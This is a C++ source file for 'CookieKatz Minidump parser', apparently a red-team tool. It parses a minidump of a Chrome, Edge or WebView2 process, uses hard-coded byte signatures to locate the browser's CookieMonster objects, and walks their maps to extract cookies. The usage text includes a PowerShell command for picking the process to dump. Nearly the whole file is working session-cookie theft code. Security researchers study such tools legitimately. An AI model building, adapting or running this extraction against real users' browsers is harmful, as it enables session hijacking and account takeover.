#include "udmp-parser.h"

#define WIN32_LEAN_AND_MEAN 
#include <Windows.h>
#include <stdio.h>
#include "Helper.h"
#include "Memory.h"

void banner() { //This is important
	printf(" _____             _    _      _   __      _       \n");
	printf("/  __ \\           | |  (_)    | | / /     | |      \n");
	printf("| /  \\/ ___   ___ | | ___  ___| |/ /  __ _| |_ ____\n");
	printf("| |    / _ \\ / _ \\| |/ / |/ _ \\    \\ / _` | __|_  /\n");
	printf("| \\__/\\ (_) | (_) |   <| |  __/ |\\  \\ (_| | |_ / / \n");
	printf(" \\____/\\___/ \\___/|_|\\_\\_|\\___\\_| \\_/\\__,_|\\__/___|\n");
	printf("By Meckazin                     github.com/Meckazin \n");
};

void usage() {
	wprintf(L"CookieKatz Minidump parser\n");
	wprintf(L"Usage: \n");
	wprintf(L"    CookieKatzMinidump.exe <Path_to_minidump_file>\n\n");
	wprintf(L"Example:\n");
	wprintf(L"    .\\CookieKatzMinidump.exe .\\msedge.DMP\n\n");
	wprintf(L"To target correct process for creating the minidump, you can use the following PowerShell command: \n");
	wprintf(L"    Get-WmiObject Win32_Process | where {$_.CommandLine -match 'network.mojom.NetworkService'} | select -Property Name,ProcessId \n");
}

int main(int argc, char* argv[]) {

	banner();
	printf("Kittens love cookies too!\n\n");

	if (argc <= 1) {
		usage();
		return EXIT_SUCCESS;
	}

	DWORD result = GetFileAttributesA(argv[1]);
	if (result == INVALID_FILE_ATTRIBUTES) {
		PrintErrorWithMessage(L"Could not find the dump file");
		return EXIT_FAILURE;
	}
	if (result != FILE_ATTRIBUTE_ARCHIVE) {
		wprintf(L"[-] File is not a minidump!\n");
		wprintf(L"    Attributes were: %d\n", result);
		return EXIT_FAILURE;
	}

	printf("[*] Trying to parse the file: %s\n", argv[1]);

	udmpparser::UserDumpParser dump;
	if (!dump.Parse(argv[1])) {
		printf("[-] Failed to parse file: %s\n", argv[1]);
		return EXIT_FAILURE;
	}

	LPCSTR dllName = "";
	size_t szPattern = 144;
	BYTE* pattern = 0;
	bool found = false;
	bool isChrome = true;

	const auto& Modules = dump.GetModules();
	for (const auto& [Base, ModuleInfo] : Modules) {
		if (ModuleInfo.ModuleName.find("chrome.exe") != std::string::npos) {
			printf("[*] Using Chrome configuration\n\n");
			dllName = "chrome.dll";
			pattern = new BYTE[144]{
			0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0xE8, 0xAA, 0xAA, 0xFF, 0xFF,
			0x85, 0xFF, 0x74, 0x08, 0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0xF0, 0x48,
			0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
			0x56, 0x57, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x89, 0xCE, 0x48, 0x8B, 0x05, 0xAA, 0xAA, 0xAA, 0xAA,
			0x48, 0x31, 0xE0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8D, 0x79, 0x30, 0x48, 0x8B, 0x49, 0x28,
			0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x8B, 0x46, 0x20, 0x48, 0x8B, 0x4E, 0x28, 0x48, 0x8B, 0x96,
			0xAA, 0x01, 0x00, 0x00, 0x4C, 0x8D, 0x44, 0x24, 0x28, 0x49, 0x89, 0x10, 0x48, 0xC7, 0x86, 0xAA,
			0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xFA, 0xFF, 0x15, 0xAA, 0xAA, 0xAA, 0xAA,
			0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0x31, 0xE1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x90, 0x48, 0x83
			};
			found = true;
			break;
		}
		else if (ModuleInfo.ModuleName.find("msedge.exe") != std::string::npos) {
			printf("[*] Using MSEdge configuration\n\n");
			dllName = "msedge.dll";
			pattern = new BYTE[144]{
				0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0xE8, 0xAA, 0xAA, 0xFF, 0xFF, 
				0x85, 0xFF, 0x74, 0x08, 0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0xF0, 0x48, 
				0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 
				0x56, 0x57, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x89, 0xCE, 0x48, 0x8B, 0x05, 0xAA, 0xAA, 0xAA, 0xAA, 
				0x48, 0x31, 0xE0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8D, 0x79, 0x30, 0x48, 0x8B, 0x49, 0x28, 
				0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x8B, 0x46, 0x20, 0x48, 0x8B, 0x4E, 0x28, 0x48, 0x8B, 0x96, 
				0xAA, 0x01, 0x00, 0x00, 0x4C, 0x8D, 0x44, 0x24, 0x28, 0x49, 0x89, 0x10, 0x48, 0xC7, 0x86, 0xAA, 
				0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xFA, 0xFF, 0x15, 0xAA, 0xAA, 0xAA, 0xAA, 
				0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0x31, 0xE1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x90, 0x48, 0x83
			};
			found = true;
			isChrome = false;
			break;
		}
		else if (ModuleInfo.ModuleName.find("msedgewebview2.exe") != std::string::npos) {
			printf("[*] Using MSEdgeWebView configuration\n\n");
			dllName = "msedge.dll";
			pattern = new BYTE[144]{
				0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0xE8, 0xAA, 0xAA, 0xFF, 0xFF,
				0x85, 0xFF, 0x74, 0x08, 0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xFB, 0x48, 0x89, 0xF0, 0x48,
				0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
				0x56, 0x57, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x89, 0xCE, 0x48, 0x8B, 0x05, 0xAA, 0xAA, 0xAA, 0x07,
				0x48, 0x31, 0xE0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8D, 0x79, 0x30, 0x48, 0x8B, 0x49, 0x28,
				0xE8, 0xAA, 0xAA, 0xAA, 0xF8, 0x48, 0x8B, 0x46, 0x20, 0x48, 0x8B, 0x4E, 0x28, 0x48, 0x8B, 0x96,
				0x48, 0x01, 0x00, 0x00, 0x4C, 0x8D, 0x44, 0x24, 0x28, 0x49, 0x89, 0x10, 0x48, 0xC7, 0x86, 0x48,
				0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xFA, 0xFF, 0x15, 0xAA, 0xAA, 0xAA, 0xAA,
				0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0x31, 0xE1, 0xE8, 0xAA, 0xAA, 0xAA, 0xFB, 0x90, 0x48, 0x83
			};
			found = true;
			isChrome = false;
			break;
		}
	}

	if (!found) {
		printf("[-] The dump is from unsupported process\n");
		return EXIT_SUCCESS;
	}

	if (dump.GetArch() != udmpparser::ProcessorArch_t::AMD64) {
		printf("[-] Dump is not from x64 process!\n");
		return EXIT_SUCCESS;
	}

	BYTE secondPattern[sizeof(uintptr_t)];
	BYTE thirdPattern[sizeof(uintptr_t)];

	uintptr_t resultAddress = 0;
	if (!FindDLLPattern(dump, dllName, pattern, szPattern, resultAddress)) {
		printf("[-] Failed to find the first pattern!\n");
		return EXIT_SUCCESS;
	}
	printf("[*] Found the first pattern at: 0x%p\n", (void*)resultAddress);
	ConvertToByteArray(resultAddress, secondPattern, sizeof(uintptr_t));

	if (!FindDLLPattern(dump, dllName, secondPattern, sizeof(uintptr_t), resultAddress)) {
		printf("[-] Failed to find the second pattern!\n");
		return EXIT_SUCCESS;
	}
	printf("[*] Found the second pattern at: 0x%p\n", (void*)resultAddress);
	ConvertToByteArray(resultAddress, thirdPattern, sizeof(uintptr_t));


	uintptr_t CookieMonsterInstances[100];
	size_t szCookieMonster = 0;

	if (!FindPattern(dump, thirdPattern, sizeof(uintptr_t), CookieMonsterInstances, szCookieMonster)) {
		printf("[-] Failed to find the third pattern!\n");
		free(CookieMonsterInstances);
		return EXIT_SUCCESS;
	}
	
	printf("\n[*] Found %zu Cookie Monster instances\n\n", szCookieMonster);

	for (size_t i = 0; i < szCookieMonster; i++)
	{
		if (CookieMonsterInstances == NULL || CookieMonsterInstances[i] == NULL)
			break;
		uintptr_t CookieMapOffset = 0x28; //This offset is fixed since the data just is there like it is
		CookieMapOffset += CookieMonsterInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
		wprintf(TEXT("[*] Found CookieMonster on 0x%p\n"), (void*)CookieMapOffset);
		WalkCookieMap(dump, CookieMapOffset, isChrome);
	}

	printf("[+] Done");

	return EXIT_SUCCESS;
}